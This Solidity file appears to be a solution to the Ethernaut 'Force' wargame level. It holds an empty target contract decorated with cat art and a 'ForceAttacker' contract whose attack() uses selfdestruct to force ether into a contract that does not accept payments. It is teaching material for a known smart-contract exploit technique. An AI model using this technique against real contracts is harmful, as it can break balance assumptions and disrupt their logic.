// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */

    }

contract ForceAttacker {
    Force public target;

    constructor(address _target) payable {
        target = Force(_target);
    }

    function attack() external payable {
        // allow funding via this function as well
        selfdestruct(payable(address(target)));
    }
}
